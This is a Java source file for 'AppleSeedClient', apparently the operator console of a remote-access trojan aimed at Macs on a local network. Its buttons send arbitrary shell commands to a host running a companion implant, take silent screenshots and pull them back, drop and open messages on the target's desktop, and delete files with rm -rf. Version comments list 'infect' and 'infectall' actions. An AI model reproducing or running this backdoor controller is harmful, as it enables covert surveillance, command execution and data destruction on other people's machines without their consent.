/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package appleseedclient;

import java.awt.FlowLayout;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.WindowConstants;

/**
 *
 * @author leijurv
 */
public class AppleSeedClient {
    //v0.1
    //0:getversion
    //1:create
    //2:unix
    //3:repeated infectall
    //4:infectall
    //5:infect

    //v0.2
    //0:getversion
    //1:create
    //2:unix command
    //3:test parsing
    //4:repeated infectall
    //5:infectall
    //6:infect
    static JComponent M;
    static Image i;
    static String host="10.1.128.100";
    static String home="";
    static String version="";
    static boolean newRequest=false;
    static ArrayList<String> paths=new ArrayList<String>();

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws Exception{
        //request1("/-","2","!/bin/sh!-c!osascript -e 'set volume 7'; say 'andrew stop telling them things'","10.1.128.210");
        //request1("/-","2","!/bin/sh!-c!osascript -e 'set volume 7'; say 'andrew stop telling them things'");
        update();
        M=new JComponent() {
            public void paintComponent(Graphics g){
                g.drawString("host: "+host,10,10);
                g.drawString("name: "+home.split("/Users/")[1],10,25);
                g.drawString("version: "+version,10,40);
                if (i!=null){
                    g.drawImage(i,0,0,null);
                }
                int X=10;
                int Y=200;
                for (int I=0; I<paths.size(); I++){
                    g.drawString(paths.get(I),X,Y+I*15);
                }
            }
        };
        JFrame frame=new JFrame("");
        frame.setContentPane(M);
        frame.setSize(2000,2000);
        frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        frame.setLayout(new FlowLayout());
        JButton ch=new JButton("host");
        ch.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e){
                host=JOptionPane.showInputDialog("Host?");
                newRequest=JOptionPane.showConfirmDialog(null,"Is "+host+" running v0.6 or newer? Very important!","New client?",JOptionPane.YES_NO_OPTION)==JOptionPane.YES_OPTION;
                update();
                M.repaint();
            }
        });
        frame.add(ch);
        JButton message=new JButton("tx message");
        message.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e){
                try{
                    String message=JOptionPane.showInputDialog("msg?");
                    String path="Desktop/kitty.txt";
                    path=JOptionPane.showInputDialog("path?");
                    request(path,"1",message);
                    request(path,"2","!open!-e");
                    Thread.sleep(1000);
                    request(path,"2","!rm!-rf");
                    M.repaint();
                } catch (Exception ex){
                    Logger.getLogger(AppleSeedClient.class.getName()).log(Level.SEVERE,null,ex);
                }
            }
        });
        frame.add(message);
        JButton screenshot=new JButton("screenshot");
        screenshot.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e){
                try{
                    request(".meow.png","2","!screencapture!-x");
                    Thread.sleep(100);
                    i=ImageIO.read(new URL("http://"+host+":15566"+home+"/.meow.png")).getScaledInstance(M.getWidth(),M.getHeight(),Image.SCALE_FAST);
                    request(".meow.png","2","!rm!-rf");
                    M.repaint();
                } catch (Exception ex){
                    ex.printStackTrace();
                }
            }
        });
        frame.add(screenshot);
        JButton close=new JButton("close");
        close.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e){
                i=null;
                M.repaint();
            }
        });
        frame.add(close);
        JButton unix=new JButton("unix");
        unix.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e){
                try{
                    String path=JOptionPane.showInputDialog("path?");
                    String command=JOptionPane.showInputDialog("command?");
                    String s=request(path,"3",command);
                    int a=JOptionPane.showConfirmDialog(null,"will do "+s.substring(7,s.length()),"u sure?",JOptionPane.YES_NO_OPTION);
                    if (a==JOptionPane.YES_OPTION){
                        request(path,"2",command);
                    }
                    M.repaint();
                } catch (Exception ex){
                    Logger.getLogger(AppleSeedClient.class.getName()).log(Level.SEVERE,null,ex);
                }
            }
        });
        frame.add(unix);
        JButton unixsh=new JButton("unix-sh");
        unixsh.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e){
                try{
                    //String path=JOptionPane.showInputDialog("path?");
                    String command=JOptionPane.showInputDialog("command?");
                    //command=command;
                    String s=request("/-","3","!/bin/sh!-c!"+command);
                    int a=JOptionPane.showConfirmDialog(null,"will do "+s.substring(7,s.length()),"u sure?",JOptionPane.YES_NO_OPTION);
                    if (a==JOptionPane.YES_OPTION){
                        request("/-","2","!/bin/sh!-c!"+command);
                    }
                    M.repaint();
                } catch (Exception ex){
                    Logger.getLogger(AppleSeedClient.class.getName()).log(Level.SEVERE,null,ex);
                }
            }
        });
        frame.add(unixsh);
        JButton other=new JButton("other");
        other.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e){
                try{
                    String action=JOptionPane.showInputDialog("action?");
                    String path=JOptionPane.showInputDialog("path?");
                    String data=JOptionPane.showInputDialog("data?");
                    request(path,action,data);
                } catch (Exception ex){
                    Logger.getLogger(AppleSeedClient.class.getName()).log(Level.SEVERE,null,ex);
                }
            }
        });
        frame.add(other);
        frame.setVisible(true);
       // request("localhost","/-","2","!/bin/sh!-c!ps -ef | grep erm");
        /*
         while (true){
         request("localhost","Desktop/meow.png","2","!screencapture!-x");
         Thread.sleep(1000);
         i=ImageIO.read(new URL("http://localhost:15566/Users/leijurv/Desktop/meow.png"));
         M.repaint();
         }
         */
        //request("localhost","Documents/thing12.txt","5");
    }

    public static void update(){
        try{
            //System.out.println("res");
            String v=request("/-","0");
            //System.out.println("res1");
            home=v.split(":")[1];
            version=v.split(":")[0];
        } catch (Exception ex){
            Logger.getLogger(AppleSeedClient.class.getName()).log(Level.SEVERE,null,ex);
        }
    }

    public static String request(String args,String method) throws Exception{
        return request(args,method,"");
    }

    public static String request(String args,String method,String data) throws Exception{
        if (newRequest){
            return request1(args,method,data);
        }
        return request2(args,method,data);
    }
public static String request1(String args,String method,String data) throws Exception{
        return request1(args,method,data,host);
    }
    public static String request1(String args,String method,String data,String hos) throws Exception{
        Socket s=new Socket(hos,15565);
        DataOutputStream oo=new DataOutputStream(s.getOutputStream());
        oo.writeUTF(args);
        oo.writeUTF(method);
        oo.writeUTF(data);
        System.out.println(args+","+method+","+data);
        DataInputStream ii=new DataInputStream(s.getInputStream());
        String r=ii.readUTF();
        //s.close();
        System.out.println("%"+r);
        return r;
    }

    public static String request2(String args,String method,String data) throws Exception{
        return request3(args,method,data,host);
    }
    public static String request3(String args,String method,String data,String hos) throws Exception{
        URL u=new URL("http://"+hos+":15565/"+args);
        //System.out.println("WHAT");
        HttpURLConnection A=(HttpURLConnection) u.openConnection();
        System.out.println("WHAT");
        A.setRequestProperty("Method",method);
        if (data.length()!=0){
            A.setRequestProperty("Data",data);
        }
        A.setRequestMethod("GET");
        InputStream i=A.getInputStream();
        Thread.sleep(100);
        ByteArrayOutputStream a=new ByteArrayOutputStream();
        System.out.println("WHAT");
        while (i.available()!=0){
            byte[] S=new byte[i.available()];
            int j=i.read(S);
            a.write(S,0,j);
        }
        byte[] S=a.toByteArray();
        i.close();
        A.disconnect();
        System.out.println("%"+new String(S));
        //paths.add(host+": "+method+","+args+","+data+"%    "+new String(S));
        return new String(S);
    }
}
